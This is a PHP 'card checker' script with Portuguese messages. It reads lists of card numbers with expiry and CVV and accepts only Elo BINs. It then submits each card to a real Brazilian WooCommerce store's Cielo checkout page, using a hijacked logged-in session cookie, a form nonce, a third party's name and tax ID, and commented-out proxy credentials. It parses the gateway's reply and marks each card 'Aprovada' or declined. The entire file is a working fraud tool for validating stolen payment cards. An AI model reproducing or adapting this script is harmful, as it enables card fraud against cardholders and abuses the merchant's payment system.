<?php
$start_time = microtime(true); 
sleep(5);
// exit('RETRY;Preparando teste');
set_time_limit(0);
extract($_REQUEST);




if (@$lista == ''){
	exit('Lista em branco');
}

list($cc, $mm, $yy, $cvv) = explode('|', $lista);

if (strlen($yy)==2){
	$yy = "20$yy";
}

if (strlen($mm)==1){
	$mm = "0$mm";
}

$ch = curl_init();

$ch = curl_init();

$proxy = 'http://zproxy.lum-superproxy.io:22225';
$proxy_auth = 'brd-customer-hl_98932ec4-zone-data_center:y3mtdh39q9w9';

$url = "https://bymed.com.br/checkout/order-pay/190798/?pay_for_order=true&key=wc_order_ue6gjCxcnjLKE";

$post = 'cielo_webservice_boleto%5Bbandeira%5D=boleto&payment_method=loja5_woo_cielo_webservice&cielo_webservice%5Bbandeira%5D=visa&cielo_webservice%5Bhash%5D=71eb0b4e74d3b716a9fb5f26a91aff8520230222154146&cielo_webservice%5Btitular%5D=joao+victor&cielo_webservice%5Bfiscal%5D=00928234169&cielo_webservice%5Bnumero%5D='.$cc.'&cielo_webservice%5Bvalidade_mes%5D='.$mm.'&cielo_webservice%5Bvalidade_ano%5D='.$yy.'&cielo_webservice%5Bcvv%5D='.$cvv.'&cielo_webservice%5Bparcela%5D=MXwxfDI5MzMuOTB8ZG1sellRPT18TWprek15NDVNQT09fGVkOWQ4ZmNlYzRjMjQzNTBjNTc2MmQzYjBjNTAxNDgz&woocommerce_pay=1&terms=on&terms-field=1&woocommerce-pay-nonce=b5f785f9b0&_wp_http_referer=%2Fcheckout%2Forder-pay%2F190798%2F%3Fpay_for_order%3Dtrue%26key%3Dwc_order_ue6gjCxcnjLKE';


	// VERIFICADOR DE BIN //

$re = array(
    "Mastercard" => "/^5\d{12}(\d{3})?$/",
    "Visa" => "/^4[0-9]{12}(?:[0-9]{3})?$/",
    "Elo" => "/^((((636368)|(438935)|(504175)|(650905)|(650518)|(451416)|(426807))\d{0,10})|((4268)|(4576)|(6550)|(6516)|(6504)||(6509)|(0001)|(000045)|(6505))\d{0,12})$/",
    "American Express" => "/^3[47]\d{13}$/",
    "jcb" => "/^(?:2131|1800|35\d{3})\d{11}$/",
    "aura" => "/^(5078\d{2})(\d{2})(\d{11})$/",
    "hipercard" => "/^(606282\d{10}(\d{3})?)|(3841\d{15})$/",
    "maestro" => "/^(?:5[0678]\d\d|6304|6390|67\d\d)\d{8,15}$/",
  );

   if (preg_match($re['Elo'], $cc)) {
     $tipo = "Elo";
  
  }
  
  else {
    echo "Reprovada $cc|$mm|$yy|$cvv Status: Bin Não Suportada </br>";
      die();
  }









	curl_setopt_array($ch, array(
	CURLOPT_URL => $url,
	CURLOPT_SSL_VERIFYPEER => false,
	CURLOPT_RETURNTRANSFER => true,
	CURLOPT_FOLLOWLOCATION => true,
	CURLOPT_POST => true,
	CURLOPT_POSTFIELDS => $post,
	//CURLOPT_PROXY, $proxy,
    //CURLOPT_PROXYUSERPWD, $proxy_auth,
	CURLOPT_ENCODING => '',
	CURLOPT_HTTPHEADER => array(
	'Host: bymed.com.br',
	'Connection: keep-alive',
	'Cache-Control: max-age=0',
	'sec-ch-ua: " Not;A Brand";v="99", "Google Chrome";v="91", "Chromium";v="91"',
	'sec-ch-ua-mobile: ?0',
	'Origin: https://bymed.com.br',
	'Upgrade-Insecure-Requests: 1',
	'DNT: 1',
	'Content-Type: application/x-www-form-urlencoded',
	'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
	'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
	'Sec-Fetch-Site: same-origin',
	'Sec-Fetch-Mode: navigate',
	'Sec-Fetch-User: ?1',
	'Sec-Fetch-Dest: document',
	'Referer: https://bymed.com.br/checkout/order-pay/190792/?pay_for_order=true&key=wc_order_kqkE7FmmqdOnB',
	'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
	'Cookie: _ga=GA1.3.170069401.1677117240; _gid=GA1.3.915644969.1677117240; wordpress_logged_in_ffc900da3a4cd9e55668cca9b7da9628=val+mende%7C1677290078%7CNSfhLGDp3I2v1My960dMxRE44KMaErJIeRKde9XJ1tB%7C5f017cf95c640e91555426c6b0dcd6c6d70f112b91b82566f240c82b5e480347; wp_woocommerce_session_ffc900da3a4cd9e55668cca9b7da9628=19013%7C%7C1677290100%7C%7C1677286500%7C%7Cb9e1ce368752b9c42c605924c57d8575; tk_ai=woo%3AM%2FGJ6fQihLRBAEhbEvwrzHJr; _gat=1',



	)
));
$result = curl_exec($ch);
if (strpos($result, '<b>LR:</b> ')!==false){
	$result = explode('<b>LR:</b> ', $result)[1];
	$result = explode('<br />', $result)[0];
	list($code, $msg) = explode(' &#8211; ', $result);
	$end_time = microtime(true);
	$execution_time = intval($end_time - $start_time); 
	if ($code == '00'){
		exit('<h6><b>✔ Aprovada &#8211; '.$cc.'|'.$mm.'|'.$yy.'|'.$cvv.' '.$bin.' ('.$execution_time.'s)</h6></b><br>');
	} elseif ($code == '82'){
		exit('<h6><b>✔ Aprovada &#8211; '.$cc.'|'.$mm.'|'.$yy.'|'.$cvv.''.$bin.' </h6></b><br>');
	} else {
		exit($msg.'<h6><b>  &#8211; '.$code.' ('.$execution_time.'s)</h6></b><br>');
	}
} else {
	exit('<h6><b> Seu Teste Está Sendo Preparado, Aguarde!</h6></b><br>');
}
